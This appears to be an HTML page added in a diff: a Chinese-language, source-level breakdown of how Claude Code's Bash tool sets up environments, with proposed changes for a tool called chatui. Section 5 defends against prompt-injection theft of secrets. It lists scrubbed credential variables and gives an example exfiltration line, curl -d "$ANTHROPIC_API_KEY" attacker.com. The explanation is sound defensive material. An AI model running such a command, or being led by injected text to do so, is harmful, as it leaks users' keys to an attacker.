@@ -1,0 +1,425 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>Claude Code 的 Bash/run 工具是怎么搭环境的 — 源码级拆解</title>
+<style>
+  body { font-family: -apple-system, "Segoe UI", "Helvetica Neue", "PingFang SC", sans-serif;
+         max-width: 980px; margin: 32px auto; padding: 0 24px; line-height: 1.6; color: #1f2328; }
+  h1 { border-bottom: 2px solid #d0d7de; padding-bottom: 10px; }
+  h2 { border-bottom: 1px solid #d0d7de; padding-bottom: 6px; margin-top: 36px; }
+  h3 { margin-top: 28px; }
+  code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  code { background: #f6f8fa; padding: 1px 5px; border-radius: 4px; font-size: 0.9em; }
+  pre { background: #f6f8fa; padding: 14px; border-radius: 6px; overflow-x: auto; font-size: 0.85em;
+        border: 1px solid #d0d7de; }
+  pre code { background: transparent; padding: 0; }
+  table { border-collapse: collapse; margin: 12px 0; width: 100%; }
+  th, td { border: 1px solid #d0d7de; padding: 8px 10px; text-align: left; vertical-align: top; }
+  th { background: #f6f8fa; }
+  blockquote { border-left: 4px solid #d0d7de; margin: 12px 0; padding: 4px 14px; color: #57606a;
+               background: #f6f8fa; }
+  .filepath { color: #0969da; font-size: 0.85em; }
+  .pill { display: inline-block; padding: 1px 8px; border-radius: 999px; font-size: 0.75em;
+          background: #ddf4ff; color: #0969da; border: 1px solid #54aeff; margin-left: 6px; }
+  .warn { background: #fff8c5; border: 1px solid #d4a72c; padding: 10px 14px; border-radius: 6px; }
+  .ok   { background: #dafbe1; border: 1px solid #2da44e; padding: 10px 14px; border-radius: 6px; }
+  ol li, ul li { margin: 4px 0; }
+  .grid { display: grid; grid-template-columns: 200px 1fr; gap: 0; border: 1px solid #d0d7de;
+          border-radius: 6px; overflow: hidden; }
+  .grid > div { padding: 10px 12px; border-bottom: 1px solid #d0d7de; }
+  .grid > div:nth-child(odd) { background: #f6f8fa; font-weight: 600; }
+  .grid > div:nth-last-child(-n+2) { border-bottom: none; }
+  .toc { background: #f6f8fa; padding: 12px 18px; border-radius: 6px; border: 1px solid #d0d7de; }
+  .toc ol { margin: 6px 0; }
+</style>
+</head>
+<body>
+
+<h1>Claude Code 的 Bash/run 工具是怎么搭环境的</h1>
+
+<p>结论先说：Claude Code <strong>不维护任何长期 shell 进程</strong>，每次 <code>Bash</code> 工具调用都会
+<code>spawn</code> 一个全新的 <code>bash -c &lt;cmd&gt;</code>。但用户的 alias / function / PATH /
+conda 激活态 <strong>不会丢</strong>，因为它在三个层面做了「持久态注入」：会话级 shell 快照、可热更新的 hook env 脚本、以及一个
+<code>cwd-track</code> 文件。下面按调用顺序拆解全部源码（路径都是 <code>claude-code/src/...</code>）。</p>
+
+<div class="toc">
+<strong>目录</strong>
+<ol>
+  <li><a href="#arch">总体架构图（一张图看完）</a></li>
+  <li><a href="#shell">第一步：选 shell（<code>findSuitableShell</code>）</a></li>
+  <li><a href="#snapshot">第二步：会话启动时做一次 ShellSnapshot</a></li>
+  <li><a href="#exec">第三步：每次 Bash 调用怎么拼命令（<code>buildExecCommand</code>）</a></li>
+  <li><a href="#env">第四步：subprocess env 是怎么算的</a></li>
+  <li><a href="#hooks">第五步：Session-env hook 文件 + <code>CLAUDE_ENV_FILE</code></a></li>
+  <li><a href="#cwd">第六步：CWD 怎么跨 Bash 调用持久化</a></li>
+  <li><a href="#bg">第七步：超时与 auto-background</a></li>
+  <li><a href="#chatui">对照：chatui 的 <code>run_command</code> 哪里被「省略」了</a></li>
+  <li><a href="#takeaway">能直接抄到 chatui 的几条改动</a></li>
+</ol>
+</div>
+
+<h2 id="arch">1. 总体架构图</h2>
+
+<pre><code>┌─────────────────────── 会话启动 (一次) ───────────────────────┐
+│                                                              │
+│  bashProvider.ts ──► createAndSaveSnapshot()                 │
+│       │                  │                                    │
+│       │                  ▼                                    │
+│       │   bash -lc &lt;snapshot-script&gt;                          │
+│       │     • source ~/.bashrc / ~/.zshrc                     │
+│       │     • dump functions / aliases / shopt / PATH         │
+│       │     • 写入  ~/.claude/shell-snapshots/snapshot-*.sh   │
+│       │                                                       │
+│       └─► 路径 lastSnapshotFilePath 缓存到内存                │
+└──────────────────────────────────────────────────────────────┘
+
+┌────────────── 每次 Bash 工具调用 (每条命令) ──────────────────┐
+│                                                              │
+│  BashTool.tsx ──► runShellCommand() ──► Shell.ts: exec()     │
+│      │                                                       │
+│      ▼                                                       │
+│  bashProvider.buildExecCommand(userCmd) 拼出：               │
+│      source &lt;snapshot&gt; 2&gt;/dev/null || true                  │
+│   && &lt;getSessionEnvironmentScript()&gt;       ← hook 注入        │
+│   && shopt -u extglob 2&gt;/dev/null || true                    │
+│   && eval '&lt;userCmd&gt;'                                        │
+│   && pwd -P &gt;| /tmp/claude-XXXX-cwd        ← cwd 持久化       │
+│                                                              │
+│      ▼                                                       │
+│  spawn(bash, ['-c', cmdString], {                            │
+│     env:  subprocessEnv()                  ← 见 §4           │
+│           + SHELL/GIT_EDITOR/CLAUDECODE                      │
+│           + envOverrides (TMUX/TMPDIR/sessionEnvVars)        │
+│     cwd:  pwd()  ← claude 进程内存里的"虚拟 cwd"             │
+│  })                                                          │
+│                                                              │
+│  命令结束后：readFileSync(cwd-track) → setCwd(...)           │
+└──────────────────────────────────────────────────────────────┘</code></pre>
+
+<h2 id="shell">2. 选 shell：<code>findSuitableShell</code></h2>
+<p class="filepath">src/utils/Shell.ts:73-141</p>
+<p>优先级（从高到低）：</p>
+<ol>
+  <li><code>$CLAUDE_CODE_SHELL</code>（必须是 bash/zsh 路径，且可执行）</li>
+  <li><code>$SHELL</code>（同上）</li>
+  <li><code>which zsh</code> / <code>which bash</code></li>
+  <li><code>/bin /usr/bin /usr/local/bin /opt/homebrew/bin</code> 下扫描</li>
+</ol>
+<p>找不到任何 bash/zsh 就直接抛错——<strong>Claude Code 不支持 sh / dash / fish</strong>。结果用 <code>memoize</code>
+缓存到整个会话生命周期。</p>
+
+<h2 id="snapshot">3. 会话启动时的 ShellSnapshot</h2>
+<p class="filepath">src/utils/bash/ShellSnapshot.ts:createAndSaveSnapshot</p>
+
+<p>Claude Code 不像 IDE 那样维护一个 long-running interactive shell（PTY），它每条命令都新开 bash 进程。
+代价是 alias / function 不会跨命令保留。<strong>解决办法：会话启动时跑一次 login shell，把当前 shell
+的「可恢复状态」dump 成一个普通脚本</strong>，后续每条命令开头 source 它一遍即可。</p>
+
+<p>Dump 的内容（<code>getUserSnapshotContent</code> + <code>getClaudeCodeSnapshotContent</code>）：</p>
+
+<table>
+<tr><th>类别</th><th>怎么 dump 的</th></tr>
+<tr><td>functions（用户）</td><td>bash: <code>declare -F</code> → 每个用 base64 包一层 <code>eval</code> 写入<br>
+zsh: <code>typeset +f</code> + <code>typeset -f $func</code></td></tr>
+<tr><td>shopt / setopt</td><td>整张吐进去（限 1000 行）</td></tr>
+<tr><td>aliases</td><td><code>alias | sed ...</code>，Windows Git Bash 还会把 <code>winpty</code> alias 过滤掉</td></tr>
+<tr><td>PATH</td><td><code>export PATH=&lt;quoted&gt;</code>（Windows 上读 Cygwin 的 PATH）</td></tr>
+<tr><td>rg/find/grep 集成</td><td>如果系统没装 rg 或者用的是 ant 内建的 bfs/ugrep，写一个 shell function 进 snapshot</td></tr>
+</table>
+
+<p>快照文件名：<code>~/.claude/shell-snapshots/snapshot-bash-&lt;ts&gt;-&lt;rand&gt;.sh</code>，带超时 10s，会话结束时 unlink。</p>
+
+<blockquote>
+为什么不直接每次都开 login shell（<code>bash -lc</code>）？因为 zsh / oh-my-zsh / Powerlevel10k / nvm 第一次启动可以
+跑 1–3 秒。snapshot 只在会话开头花一次这个钱，后续每条命令都是 <code>bash -c &lt;snapshot+cmd&gt;</code>，零冷启动。
+快照失败就 fallback 到 <code>bash -lc</code>（<code>getSpawnArgs</code> 里看 <code>lastSnapshotFilePath</code> 是不是 undefined）。
+</blockquote>
+
+<h2 id="exec">4. 每次 Bash 调用怎么拼命令</h2>
+<p class="filepath">src/utils/shell/bashProvider.ts:buildExecCommand</p>
+
+<p>用户传进来的 <code>userCmd</code>（比如 <code>pytest -k foo</code>）会被拼成下面这个大命令串：</p>
+
+<pre><code># 1) 恢复 alias / function / PATH
+source '/home/me/.claude/shell-snapshots/snapshot-bash-...sh' 2&gt;/dev/null || true
+
+# 2) 注入 session-env hook 脚本（见 §5）—— 比如 conda activate
+export PATH="/opt/conda/envs/foo/bin:$PATH"
+export CONDA_PREFIX=/opt/conda/envs/foo
+
+# 3) 安全收敛：禁掉 extglob，避免恶意文件名展开攻击
+shopt -u extglob 2&gt;/dev/null || true
+
+# 4) 真正运行用户命令（用 eval 让 source 进来的 alias 能展开）
+eval 'pytest -k foo'
+
+# 5) 把命令结束时的 cwd 写到 track 文件
+pwd -P &gt;| '/tmp/claude-3a7f-cwd'</code></pre>
+
+<p>整串用 <code>&amp;&amp;</code> 串起来——前面一步失败就不跑后面，但 <code>source ... || true</code> 容错，
+快照文件被清掉也不会让命令本身挂掉。然后 <code>spawn(bash, ['-c', cmdString], {...})</code>。</p>
+
+<h3>4.1 几个不显眼但很关键的细节</h3>
+
+<ul>
+  <li><strong>用 <code>eval</code> 而不是直接拼接</strong>：bash 在解析整行时已经决定哪些 token 是 alias，
+      <code>source</code> 之后定义的 alias 在同一行不会展开。<code>eval</code> 触发第二次解析，alias 才生效。</li>
+  <li><strong><code>pwd -P</code> 而不是 <code>pwd</code></strong>：返回物理路径（解掉 symlink），
+      和 Node.js 的 <code>process.cwd()</code> 行为一致。</li>
+  <li><strong><code>&gt;|</code> 而不是 <code>&gt;</code></strong>：强制覆盖，绕开 <code>set -o noclobber</code>。</li>
+  <li><strong>Windows null 重定向防御性改写</strong>：<code>rewriteWindowsNullRedirect</code>
+      把 <code>2&gt;nul</code>（CMD 风格）改成 <code>2&gt;/dev/null</code>，避免在 Git Bash 下创建一个真叫 <code>nul</code>
+      的文件搞坏 git。</li>
+  <li><strong>管道里的 stdin 重定向</strong>：<code>rearrangePipeCommand</code> 把 <code>cmd | wc &lt; /dev/null</code>
+      改成 <code>cmd &lt; /dev/null | wc</code>，否则 <code>eval</code> 会把 stdin 喂给 <code>wc</code>，
+      <code>cmd</code> 反而挂在打开的 stdin 上等输入。</li>
+  <li><strong>超长命令（heredoc / 多行）</strong>：用 <code>shell-quote</code> 整体 base64 一遍，再交给 eval。</li>
+</ul>
+
+<h3>4.2 spawn 参数</h3>
+<p class="filepath">src/utils/Shell.ts:213-260</p>
+
+<pre><code>spawn(binShell, ['-c', commandString], {     // ← 注意没有 -l
+  env: {
+    ...subprocessEnv(),                       // process.env 经过 §4 的脱敏
+    SHELL: binShell,
+    GIT_EDITOR: 'true',                       // 阻止 git commit 弹 vim
+    CLAUDECODE: '1',                          // 子进程探测自己是不是被 claude 调起
+    ...envOverrides,                          // bashProvider.getEnvironmentOverrides
+  },
+  cwd: pwd(),                                 // claude 内存里的"虚拟 cwd"
+  stdio: ['pipe', outputHandle.fd, outputHandle.fd],   // stdout/stderr → 文件
+  detached: true,                             // 用 tree-kill 杀整个进程组
+})</code></pre>
+
+<p>注意 <strong>没有 <code>-l</code></strong>（login）：因为 alias / PATH / function 都已经从 snapshot 来了，
+不需要再走 <code>.bash_profile</code>/<code>.bashrc</code>。只有 snapshot 失败时才会回落到 <code>-l</code>。</p>
+
+<h2 id="env">5. <code>subprocessEnv()</code> 干什么</h2>
+<p class="filepath">src/utils/subprocessEnv.ts</p>
+
+<p>默认就是 <code>process.env</code> 透传——claude 进程是怎么被启动的，子进程就继承怎样的环境。
+<strong>没有任何「strip CONDA_PREFIX」「重置 PATH」之类的清洗</strong>。</p>
+
+<p>但有一个安全选项 <code>CLAUDE_CODE_SUBPROCESS_ENV_SCRUB</code>（GitHub Actions 里 <code>claude-code-action</code>
+会自动开）：会从子进程 env 里删掉一组「会被 prompt-injection 利用导出的密钥」：</p>
+
+<pre><code>ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN, ANTHROPIC_AUTH_TOKEN,
+ANTHROPIC_FOUNDRY_API_KEY, ANTHROPIC_CUSTOM_HEADERS,
+OTEL_EXPORTER_OTLP_HEADERS, OTEL_EXPORTER_OTLP_LOGS_HEADERS, ...
+AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, AWS_BEARER_TOKEN_BEDROCK,
+GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET, ...
+ACTIONS_ID_TOKEN_REQUEST_TOKEN, ACTIONS_RUNTIME_TOKEN, ACTIONS_RUNTIME_URL,
+ALL_INPUTS, OVERRIDE_GITHUB_TOKEN, DEFAULT_WORKFLOW_TOKEN, SSH_SIGNING_KEY</code></pre>
+
+<p>说人话：claude 进程自己请求 API 时仍然能读到这些 key，但每条 Bash 命令里 <code>$ANTHROPIC_API_KEY</code>
+是空字符串——防止模型被诱导写出 <code>curl -d "$ANTHROPIC_API_KEY" attacker.com</code>。</p>
+
+<p><code>bashProvider.getEnvironmentOverrides</code> 还会再 merge 三件东西：</p>
+<table>
+<tr><th>变量</th><th>来源</th><th>作用</th></tr>
+<tr><td><code>TMUX</code></td><td>Claude 自己起的隔离 socket</td>
+    <td>所有 tmux 命令落到 claude 私有 socket，不污染用户的 tmux</td></tr>
+<tr><td><code>TMPDIR / CLAUDE_CODE_TMPDIR / TMPPREFIX</code></td><td>sandbox 模式下</td>
+    <td>把临时文件锁进 sandbox 内的目录</td></tr>
+<tr><td>用户用 <code>/env FOO=bar</code> 设的</td><td><code>sessionEnvVars</code> Map</td>
+    <td>子进程能看到 <code>$FOO=bar</code>，但 REPL 进程自己看不到（防自杀）</td></tr>
+</table>
+
+<h3>5.1 还有一个外部钩子：<code>CLAUDE_CODE_SHELL_PREFIX</code></h3>
+<p class="filepath">src/utils/bash/shellPrefix.ts</p>
+
+<p>如果设了这个 env 变量，整条命令串会再被包一层：<code>$PREFIX &lt;quoted-cmd&gt;</code>。
+典型用法是 <code>CLAUDE_CODE_SHELL_PREFIX="docker exec myc bash -c"</code>——
+把所有 Bash 命令转发到 docker container 里跑。</p>
+
+<h2 id="hooks">6. Session-env hook 文件 + <code>CLAUDE_ENV_FILE</code></h2>
+<p class="filepath">src/utils/sessionEnvironment.ts:getSessionEnvironmentScript</p>
+
+<p>这是 <strong>Claude Code 解决「activate 不持久」问题的官方答案</strong>，也是 chatui 完全没有的能力。
+机制如下：</p>
+
+<ol>
+  <li>会话目录：<code>~/.claude/session-env/&lt;sessionId&gt;/</code></li>
+  <li>里面可以有四类文件：
+    <pre><code>setup-hook-0.sh         # 启动时跑一次
+sessionstart-hook-0.sh   # 会话开始
+cwdchanged-hook-0.sh     # 用户 cd 之后
+filechanged-hook-0.sh    # 文件变化触发</code></pre>
+  </li>
+  <li><code>buildExecCommand</code> 在 source snapshot 之后、跑用户命令之前，
+      会把这一堆文件按优先级排序后<strong>全部拼到命令串里</strong>（不是 source，是直接 inline）。
+      一旦 cwd 变化或文件变化，对应的 hook 文件被重写，<strong>下一条 Bash 命令就立刻看到新值</strong>。</li>
+  <li>额外：父进程可以设 <code>CLAUDE_ENV_FILE=/path/to/script.sh</code>。
+      <code>getSessionEnvironmentScript</code> 会优先读它（再 + hook 文件）。
+      <em>注释里特意写了一句</em>：「This allows venv/conda activation to persist across shell commands」。</li>
+</ol>
+
+<h3>6.1 实例：HFI trajectory runner 用 <code>CLAUDE_ENV_FILE</code> 锁住 conda env</h3>
+
+<p>父进程在 spawn claude 之前，写一个 activate 脚本：</p>
+
+<pre><code># /tmp/claude-env-keyan.sh
+export CONDA_PREFIX=/opt/conda/envs/keyan
+export PATH=/opt/conda/envs/keyan/bin:$PATH
+export PYTHONPATH=/opt/conda/envs/keyan/lib/python3.11/site-packages
+export LD_LIBRARY_PATH=/opt/conda/envs/keyan/lib:${LD_LIBRARY_PATH:-}
+hash -r</code></pre>
+
+<p>然后：</p>
+
+<pre><code>CLAUDE_ENV_FILE=/tmp/claude-env-keyan.sh claude</code></pre>
+
+<p>之后用户问「跑测试」，模型发出 <code>pytest -k foo</code>，最终在 bash 里跑的是：</p>
+
+<pre><code>source &lt;snapshot&gt; \
+&& export CONDA_PREFIX=/opt/conda/envs/keyan \
+&& export PATH=/opt/conda/envs/keyan/bin:$PATH \
+&& ... \
+&& shopt -u extglob \
+&& eval 'pytest -k foo' \
+&& pwd -P &gt;| ...</code></pre>
+
+<p>模型完全不用知道这件事，<code>which python</code> 自然指向 <code>/opt/conda/envs/keyan/bin/python</code>。</p>
+
+<h3>6.2 实例：<code>/env</code> 临时改环境变量</h3>
+
+<p class="filepath">src/utils/sessionEnvVars.ts</p>
+
+<p>会话内可以执行 <code>/env API_KEY=xxx</code>（注意：开源版本的 <code>/env</code> 命令是 stub，
+要么是 ant-internal 才开放，要么用户得自己调 <code>setSessionEnvVar</code>）。设了之后：</p>
+
+<ul>
+  <li>存到内存的 <code>Map&lt;string,string&gt;</code></li>
+  <li><code>bashProvider.getEnvironmentOverrides</code> 把它 merge 进 spawn 的 <code>env</code></li>
+  <li>但 REPL 进程自己看不到——避免模型一句 <code>os.environ.clear()</code> 把自己搞死</li>
+</ul>
+
+<h2 id="cwd">7. CWD 怎么跨 Bash 调用持久化</h2>
+
+<p>每次命令结尾的 <code>pwd -P &gt;| /tmp/claude-XXXX-cwd</code> 不是装饰品。<code>Shell.ts:exec</code> 里：</p>
+
+<pre><code>void shellCommand.result.then(async result =&gt; {
+  if (!preventCwdChanges &amp;&amp; !result.backgroundTaskId) {
+    const newCwd = readFileSync(cwdFilePath, 'utf8').trim()
+    if (newCwd.normalize('NFC') !== cwd) {
+      setCwd(newCwd, cwd)             // ← 写回 claude 内存的"虚拟 cwd"
+      invalidateSessionEnvCache()
+      void onCwdChangedForHooks(cwd, newCwd)   // ← 触发 cwdchanged-hook
+    }
+  }
+  unlinkSync(cwdFilePath)
+})</code></pre>
+
+<p>所以模型发一条 <code>cd /tmp &amp;&amp; ls</code>，下一条命令的 <code>spawn()</code> 的 <code>cwd</code> 就已经是 <code>/tmp</code>。
+看上去像是 shell 持久了，<strong>实际是 Claude 在内存里维护了一个虚拟 PWD</strong>。这个 PWD 还会反过来触发
+<code>cwdchanged-hook-N.sh</code>——比如自动检测 <code>.python-version</code> 切 pyenv。</p>
+
+<h2 id="bg">8. 超时与 auto-background</h2>
+<p class="filepath">src/tools/BashTool/BashTool.tsx:runShellCommand</p>
+
+<p>这是和 chatui <code>run_command</code> 差异最大的地方：</p>
+
+<ul>
+  <li><strong>默认 30 分钟</strong>（<code>DEFAULT_TIMEOUT = 30 * 60_000</code>）。chatui 默认 60s/300s。</li>
+  <li><strong>Streaming progress</strong>：<code>TaskOutput</code> 每秒拉一次输出，作为 SSE
+      progress 推到前端。chatui 也有 <code>on_chunk</code>。</li>
+  <li><strong>auto-background on timeout</strong>：超时不直接报错，<code>onTimeout</code>
+      钩子把命令塞到 <code>spawnShellTask</code>，转成长任务，模型可以稍后用 <code>BashOutput</code> 工具
+      poll。常见命令（npm/yarn/python/cargo/jest/pytest/curl/dev/serve/watch...）才允许 auto-background。
+      sleep / 黑名单命令不能。</li>
+  <li><strong>显式 <code>run_in_background: true</code></strong> 也走同一条 <code>spawnShellTask</code>。</li>
+  <li><strong>Kairos 助手模式</strong>：主线程命令超过 <code>ASSISTANT_BLOCKING_BUDGET_MS</code> 就强制
+      auto-background 让 agent 继续响应。</li>
+</ul>
+
+<p>整套是「foreground 任务 → 长跑 → 升级为 background 任务」的状态机，比 chatui 那个一锤子超时报错优雅得多。</p>
+
+<h2 id="chatui">9. 对照：chatui 的 <code>run_command</code> 哪里被「省略」了</h2>
+
+<p class="filepath">chatui:lib/project_mod/tools.py</p>
+
+<table>
+<tr><th>能力</th><th>Claude Code</th><th>chatui</th></tr>
+<tr><td>Shell 选择</td>
+    <td><code>$CLAUDE_CODE_SHELL</code> → <code>$SHELL</code> → 自动扫描，必须 bash/zsh</td>
+    <td>无；直接 <code>shell=True</code> 让 Python 决定（POSIX 上是 <code>/bin/sh</code>）</td></tr>
+<tr><td>Alias / function 持久化</td>
+    <td>会话级 ShellSnapshot 重放</td>
+    <td>无；alias 全部失效（因为是 <code>/bin/sh</code> 非交互）</td></tr>
+<tr><td>conda/venv 激活态持久化</td>
+    <td><code>CLAUDE_ENV_FILE</code> + session-env hook 文件，每条命令自动 source</td>
+    <td>仅当 cwd 下有 <code>.venv/</code> 才自动加 PATH；conda env 完全不识别</td></tr>
+<tr><td>CWD 持久化</td>
+    <td><code>pwd -P &gt;| file</code> + <code>setCwd</code>，<code>cd</code> 会跨命令保留</td>
+    <td>每次都用调用方传入的 <code>base</code>，<code>cd</code> 用完即丢</td></tr>
+<tr><td>超时 → background</td>
+    <td>auto-background 升级为长任务，可后续 poll</td>
+    <td>超时即 <code>kill</code></td></tr>
+<tr><td>Streaming 输出</td>
+    <td>有（<code>TaskOutput</code> 每秒 tick）</td>
+    <td>有（<code>on_chunk</code>）</td></tr>
+<tr><td>临时改 env</td>
+    <td><code>/env FOO=bar</code> 写入 <code>sessionEnvVars</code> Map</td>
+    <td>无；要改只能改 server <code>SHELL_PREFIX</code>（全局重启）</td></tr>
+<tr><td>Shell 包裹器</td>
+    <td><code>CLAUDE_CODE_SHELL_PREFIX="docker exec ..."</code></td>
+    <td><code>SHELL_PREFIX="source .. &amp;&amp;"</code>（拼字符串而非可执行）</td></tr>
+<tr><td>密钥脱敏</td>
+    <td><code>CLAUDE_CODE_SUBPROCESS_ENV_SCRUB</code> 删 25+ 个密钥变量</td>
+    <td>无</td></tr>
+<tr><td>Sandbox</td>
+    <td><code>shouldUseSandbox</code> + <code>bwrap</code>/macOS sandbox-exec</td>
+    <td>无（只有命令黑名单 <code>DANGEROUS_PATTERNS</code>）</td></tr>
+</table>
+
+<div class="warn">
+<strong>对症 mppgb4nwnximkd 那个反馈</strong>：他每次都得手指 python 路径，<u>不是因为 chatui server 没有走 tofu env</u>
+（<code>.tofu_env.json</code> re-exec 早就把 PATH 设对了），<strong>而是因为 chatui 没有
+"per-conversation activate 脚本" 这个机制</strong>。当他切到一个不是 tofu 的项目（比如 keyan 自己有 conda env），
+就只能在每条 <code>run_command</code> 里写绝对路径——chatui 没有任何地方让他贴一个
+「activate 这个项目用的 env」的脚本。
+</div>
+
+<h2 id="takeaway">10. 能直接抄到 chatui 的几条改动（按 ROI 排序）</h2>
+
+<ol>
+<li><strong>抄 <code>CLAUDE_ENV_FILE</code></strong>：在 <code>_get_cmd_env(cwd)</code> 里读一个
+    <code>$CHATUI_ENV_FILE</code>，如果存在就把整个文件 prepend 到 <code>full_command</code>
+    最前面（<code>source &lt;file&gt; &amp;&amp; &lt;cmd&gt;</code>）。一行改动，立刻解决「per-deployment 锁定 conda env」。
+    <pre><code># lib/project_mod/tools.py
+shell_prefix = SHELL_PREFIX
+env_file = os.environ.get('CHATUI_ENV_FILE')
+if env_file and os.path.isfile(env_file):
+    shell_prefix = f"source {shlex.quote(env_file)} &amp;&amp; {shell_prefix}".strip(' &amp;')
+full_command = f'{shell_prefix} {command}' if shell_prefix else command</code></pre>
+</li>
+
+<li><strong>抄 session-env hook 目录</strong>：<code>~/.chatui/session-env/&lt;conv_id&gt;/setup-hook-*.sh</code>，
+    <code>tool_run_command</code> 每次都拼进去；用户 <code>cd</code> 时（如果实现了 cwd 持久化）触发
+    <code>cwdchanged-hook-*.sh</code> 重写。这个机制是 Claude Code「每个 project 一套独立 conda env」的
+    干净答案，比硬编码 <code>.python_env</code> 字段灵活得多。</li>
+
+<li><strong>抄 cwd 持久化</strong>：在 <code>_run_command_simple</code> 末尾尾巴上
+    <code>; pwd -P &gt; /tmp/chatui-{tid}-cwd</code>，读回来更新 <code>conv_roots[name].cwd</code>。
+    这样模型一条 <code>cd subdir &amp;&amp; pytest</code> 真的会持久。</li>
+
+<li><strong>抄 ShellSnapshot</strong>：会话第一次 spawn 命令前，跑一次 <code>bash -lc &lt;dump-script&gt;</code>，
+    把 alias / function / PATH 落盘，后续命令 <code>source</code> 它一下。chatui 现在 <code>shell=True</code>
+    走的是 <code>/bin/sh</code>，用户的 alias 全用不上——这条改动让模型在 chatui 里跑命令的体验贴近用户终端。</li>
+
+<li><strong>auto-background</strong>：<code>pytest</code> / <code>npm run dev</code> 这种长跑命令
+    超时不要 kill，转成「task 列表里的后台任务」让模型 poll。chatui 已经有 <code>tasks</code> 模型，
+    需要的只是把 <code>run_command</code> 的超时分支改成「move to background」。</li>
+</ol>
+
+<div class="ok">
+<strong>最小可行改动</strong>：1️⃣ 一晚上能落地，且对 mppgb4nwnximkd 直接管用——
+他在自己 deployment 里写一个 <code>activate-keyan.sh</code>，<code>export CHATUI_ENV_FILE=...</code> 启服务，
+之后所有 <code>run_command</code> 自动 source 一遍，<code>python</code> 永远是 keyan env 的那个。
+不用改任何模型调用方式。
+</div>
+
+</body>
+</html>
